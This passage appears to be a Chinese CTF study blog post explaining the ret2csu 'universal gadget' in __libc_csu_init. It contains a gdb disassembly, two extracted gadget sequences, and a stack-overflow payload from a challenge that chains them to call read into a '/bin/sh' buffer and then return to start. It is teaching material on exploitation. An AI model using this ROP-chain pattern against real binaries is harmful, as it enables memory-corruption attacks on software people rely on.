+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble /r __libc_csu_init</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __libc_csu_init:</span><br><span class="line">   <span class="number">0x00000000004007d0</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">41</span> <span class="number">57</span>   push   r15</span><br><span class="line">   <span class="number">0x00000000004007d2</span> &lt;+<span class="number">2</span>&gt;:     <span class="number">41</span> <span class="number">56</span>   push   r14</span><br><span class="line">   <span class="number">0x00000000004007d4</span> &lt;+<span class="number">4</span>&gt;:     <span class="number">49</span> <span class="number">89</span> d7        mov    r15,rdx</span><br><span class="line">   <span class="number">0x00000000004007d7</span> &lt;+<span class="number">7</span>&gt;:     <span class="number">41</span> <span class="number">55</span>   push   r13</span><br><span class="line">   <span class="number">0x00000000004007d9</span> &lt;+<span class="number">9</span>&gt;:     <span class="number">41</span> <span class="number">54</span>   push   r12</span><br><span class="line">   <span class="number">0x00000000004007db</span> &lt;+<span class="number">11</span>&gt;:    <span class="number">4</span>c <span class="number">8</span>d <span class="number">25</span> <span class="number">16</span> <span class="number">06</span> <span class="number">20</span> <span class="number">00</span>    lea    r12,[rip+<span class="number">0x200616</span>]        # <span class="number">0x600df8</span></span><br><span class="line">   <span class="number">0x00000000004007e2</span> &lt;+<span class="number">18</span>&gt;:    <span class="number">55</span>      push   rbp</span><br><span class="line">   <span class="number">0x00000000004007e3</span> &lt;+<span class="number">19</span>&gt;:    <span class="number">48</span> <span class="number">8</span>d <span class="number">2</span>d <span class="number">16</span> <span class="number">06</span> <span class="number">20</span> <span class="number">00</span>    lea    rbp,[rip+<span class="number">0x200616</span>]        # <span class="number">0x600e00</span></span><br><span class="line">   <span class="number">0x00000000004007ea</span> &lt;+<span class="number">26</span>&gt;:    <span class="number">53</span>      push   rbx</span><br><span class="line">   <span class="number">0x00000000004007eb</span> &lt;+<span class="number">27</span>&gt;:    <span class="number">41</span> <span class="number">89</span> fd        mov    r13d,edi</span><br><span class="line">   <span class="number">0x00000000004007ee</span> &lt;+<span class="number">30</span>&gt;:    <span class="number">49</span> <span class="number">89</span> f6        mov    r14,rsi</span><br><span class="line">   <span class="number">0x00000000004007f1</span> &lt;+<span class="number">33</span>&gt;:    <span class="number">4</span>c <span class="number">29</span> e5        sub    rbp,r12</span><br><span class="line">   <span class="number">0x00000000004007f4</span> &lt;+<span class="number">36</span>&gt;:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>     sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00000000004007f8</span> &lt;+<span class="number">40</span>&gt;:    <span class="number">48</span> c1 fd <span class="number">03</span>     sar    rbp,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x00000000004007fc</span> &lt;+<span class="number">44</span>&gt;:    ff <span class="number">15</span> f6 <span class="number">07</span> <span class="number">20</span> <span class="number">00</span>       call   QWORD PTR [rip+<span class="number">0x2007f6</span>]        # <span class="number">0x600ff8</span></span><br><span class="line">   <span class="number">0x0000000000400802</span> &lt;+<span class="number">50</span>&gt;:    <span class="number">48</span> <span class="number">85</span> ed        test   rbp,rbp</span><br><span class="line">   <span class="number">0x0000000000400805</span> &lt;+<span class="number">53</span>&gt;:    <span class="number">74</span> <span class="number">1f</span>   je     <span class="number">0x400826</span> &lt;__libc_csu_init+<span class="number">86</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000400807</span> &lt;+<span class="number">55</span>&gt;:    <span class="number">31</span> db   xor    ebx,ebx</span><br><span class="line">   <span class="number">0x0000000000400809</span> &lt;+<span class="number">57</span>&gt;:    <span class="number">0f</span> <span class="number">1f</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    nop    DWORD PTR [rax+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x0000000000400810</span> &lt;+<span class="number">64</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> fa        mov    rdx,r15</span><br><span class="line">   <span class="number">0x0000000000400813</span> &lt;+<span class="number">67</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> f6        mov    rsi,r14</span><br><span class="line">   <span class="number">0x0000000000400816</span> &lt;+<span class="number">70</span>&gt;:    <span class="number">44</span> <span class="number">89</span> ef        mov    edi,r13d</span><br><span class="line">   <span class="number">0x0000000000400819</span> &lt;+<span class="number">73</span>&gt;:    <span class="number">41</span> ff <span class="number">14</span> dc     call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line">   <span class="number">0x000000000040081d</span> &lt;+<span class="number">77</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>     add    rbx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000400821</span> &lt;+<span class="number">81</span>&gt;:    <span class="number">48</span> <span class="number">39</span> dd        cmp    rbp,rbx</span><br><span class="line">   <span class="number">0x0000000000400824</span> &lt;+<span class="number">84</span>&gt;:    <span class="number">75</span> ea   jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000400826</span> &lt;+<span class="number">86</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>     add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line">   <span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line">   <span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line">   <span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line">   <span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line">   <span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line">   <span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>从中提取出两段（必须以ret结尾），把它们叫做 rop1 和 rop2：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line"><span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line"><span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line"><span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line"><span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line"><span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line"><span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400810</span> &lt;+<span class="number">64</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> fa        mov    rdx,r15</span><br><span class="line"> <span class="number">0x0000000000400813</span> &lt;+<span class="number">67</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> f6        mov    rsi,r14</span><br><span class="line"> <span class="number">0x0000000000400816</span> &lt;+<span class="number">70</span>&gt;:    <span class="number">44</span> <span class="number">89</span> ef        mov    edi,r13d</span><br><span class="line"> <span class="number">0x0000000000400819</span> &lt;+<span class="number">73</span>&gt;:    <span class="number">41</span> ff <span class="number">14</span> dc     call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line"> <span class="number">0x000000000040081d</span> &lt;+<span class="number">77</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>     add    rbx,<span class="number">0x1</span></span><br><span class="line"> <span class="number">0x0000000000400821</span> &lt;+<span class="number">81</span>&gt;:    <span class="number">48</span> <span class="number">39</span> dd        cmp    rbp,rbx</span><br><span class="line"> <span class="number">0x0000000000400824</span> &lt;+<span class="number">84</span>&gt;:    <span class="number">75</span> ea   jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400826</span> &lt;+<span class="number">86</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>     add    rsp,<span class="number">0x8</span></span><br><span class="line"> <span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line"> <span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line"> <span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line"> <span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line"> <span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line"> <span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line"> <span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到rop1 中连续六个 pop，可以将栈顶的六个值传入pop rbx_rbp_r12_r13_r14_r15</p>
+<p>rop2中可以传递寄存器的值rdx(r13), rsi(r14), edi(r15d)</p>
+<p>rdi,rsi,rdx正好是64位传参的前三个寄存器<br>因此我们可以借此gadget给某个函数传入参数控制程序，接下来我分析一下利用gadget的流程。</p>
+<p>用我最近做的一个题的payload来说明<br>payload如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">"a"</span> * <span class="number">0x48</span> + p64(rop1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line"> + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)+</span><br><span class="line"> + p64(rop2)+<span class="string">"\x00"</span> * <span class="number">56</span>+p64(start_addr)+payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先是栈溢出到函数返回地址，填充为rop1的地址,后面加上六个参数，再加上rop2,再填充56个字节，最后加上函数start的地址。后面填充’a’到200完成payload的输入</p>
+<p>仔细阅读rop1和rop2的汇编代码了解程序流程</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">有个地方思考时很容易乱，就是程序执行流eip指向执行的是代码段，但是是在栈里对数据进行处理的。</span><br></pre></td></tr></table></figure>
+
+<p>首先payload输入后，执行rop1的汇编</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ret指令会 </span><br><span class="line"></span><br><span class="line">将rsp加<span class="number">8</span> 则rsp会指向p64(<span class="number">0</span>)		即覆盖的第一个参数</span><br><span class="line"></span><br><span class="line">将函数返回地址传给eip </span><br><span class="line"></span><br><span class="line">eip指向函数返回地址，即rop1的地址，</span><br><span class="line">程序开始执行rop1里的汇编代码</span><br></pre></td></tr></table></figure>
+
+<p>由rop1可知pop指令将参数传给各个寄存器中<br>每次将栈里数据pop后rsp都会加上8<br>如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rbx &lt;-- <span class="number">0</span></span><br><span class="line">rbp &lt;-- <span class="number">1</span></span><br><span class="line">r12 &lt;-- read_got</span><br><span class="line">r13 &lt;-- <span class="number">8</span></span><br><span class="line">r14 &lt;-- binsh_addr</span><br><span class="line">r15 &lt;-- <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>此时rsp指向了rop2，<br>同样的，rop1的ret指令将</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eip &lt;-- rop2的地址</span><br><span class="line">rsp+=<span class="number">8</span>;	指向了填充的<span class="number">56</span>*<span class="string">'a'</span></span><br></pre></td></tr></table></figure>
+
+<p>开始执行rop2的汇编代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rdx &lt;-- r15 &lt;-- <span class="number">1</span></span><br><span class="line">rsi &lt;-- r14 &lt;-- binsh_addr</span><br><span class="line">edi &lt;-- r13 &lt;-- <span class="number">8</span></span><br><span class="line">将这三个参数传入了前三个寄存器中</span><br><span class="line">call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line">这句汇编就可以调用r12里的函数地址并将 上面寄存器的参数传给此函数</span><br></pre></td></tr></table></figure>
+
+<p>可以知道payload的调用函数为第三个参数<br>传入函数的三个参数<br>分别在payload传入的第6，5，4个参数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">接着</span><br><span class="line">add    rbx,<span class="number">0x1</span>  （rbx=<span class="number">1</span>）</span><br><span class="line">cmp    rbp,rbx   (rbp=<span class="number">1</span>,rbx=<span class="number">1</span>)</span><br><span class="line">jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line"><span class="comment">//有下面的指令解释可以知道相等不跳转</span></span><br><span class="line">所以继续执行下面的汇编</span><br><span class="line">add    rsp,<span class="number">0x8</span></span><br><span class="line">pop    rbx</span><br><span class="line">   pop    rbp</span><br><span class="line">   pop    r12</span><br><span class="line">   pop    r13</span><br><span class="line">   pop    r14</span><br><span class="line">   pop    r15</span><br><span class="line">这几句将rsp+<span class="number">7</span>*<span class="number">8</span>就是加上了<span class="number">56</span></span><br><span class="line">由payload知道，此时rsp正好跳过了<span class="number">56</span>*<span class="string">'a'</span>指向了start函数的地址</span><br><span class="line">最后ret指令</span><br><span class="line">eip &lt;-- start地址</span><br></pre></td></tr></table></figure>
+
+<p>到这里通用gadget完成了一次调用</p>
+<p>  这个payload的作用就是调用了read函数读取内容到要填写binsh的地址<br>并重新执行函数start</p>
+<p>下面附上我手画的一张栈空间结构图，可以根据这个分析一下流程！</p>
+<p><img alt data-src="/2019/11/01/通用gadget原理分析/1.jpg" class="lazyload"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指令cmp ax,bx 的逻辑含义是比较ax和bx的值，如果执行后：</span><br><span class="line"><span class="number">1.</span>  zf=<span class="number">1</span> ===&gt; (ax)=(bx)</span><br><span class="line"><span class="number">2.</span>  zf=<span class="number">0</span> ===&gt; (ax)!=(bx)</span><br><span class="line"><span class="number">3.</span>  cf=<span class="number">1</span> ===&gt; (ax)&lt;(bx)</span><br><span class="line"><span class="number">4.</span>  cf=<span class="number">0</span> ===&gt; (ax)&gt;=(bx)</span><br><span class="line"><span class="number">5.</span>  cf=zf=<span class="number">0</span> ===&gt; (ax)&gt;(bx)</span><br><span class="line"><span class="number">6.</span>  cf=<span class="number">1</span>或zf=<span class="number">1</span> ===&gt; (ax)&lt;=(bx)</span><br><span class="line">cmp指令的比较结果需要通过条件转移指令来检测。</span><br><span class="line">|指令 |解释 |含义 |检测的相关标志位|</span><br><span class="line">|-------|-------|-------|----------------|</span><br><span class="line">|je|e:equal|等于则转移|zf=<span class="number">1</span>|</span><br><span class="line">|jne|ne:<span class="keyword">not</span> equal|不等于则转移|zf=<span class="number">0</span>|</span><br><span class="line">|jb|b:below|低于则转移|cf=<span class="number">1</span>|</span><br><span class="line">|jnb|nb:<span class="keyword">not</span> below| 不低于则转移| cf=<span class="number">0</span>|</span><br><span class="line">|ja |a:above| 高于则转移| cf=<span class="number">0</span>且zf=<span class="number">0</span>|</span><br><span class="line">|jna| na:<span class="keyword">not</span> above| 不高于则转移| cf=<span class="number">1</span>或zf=<span class="number">1</span>|</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>pwn学习</tag>
       </tags>
   </entry>
 </search>
